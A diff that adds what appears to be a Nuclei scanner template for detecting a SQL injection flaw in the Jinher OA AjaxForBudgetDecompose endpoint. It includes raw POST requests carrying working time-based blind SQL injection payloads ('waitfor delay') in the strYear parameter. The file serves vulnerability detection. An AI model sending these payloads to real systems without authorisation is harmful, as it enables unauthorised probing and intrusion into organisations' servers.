@@ -1,0 +1,48 @@
+id: poc-yaml-jinher-jhsoft-ajaxforbudgetdecompose-aspx-sqli
+info:
+  name: "金和 OA AjaxForBudgetDecompose 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和 OA
+  metadata:
+    app: "Jinher OA"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-jhsoft
+    name: Verify JHSoft Application
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+
+  - id: check-sqli
+    raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForBudgetDecompose.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        strType=getBudgetTime&strYear=1'waitfor+delay%270:0:5%27--
+      - |
+        POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForBudgetDecompose.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        strType=getBudgetTime&strYear=1'waitfor+delay%270:0:8%27--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "!contains(header, 'cookie')"
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+    matchers-condition: and
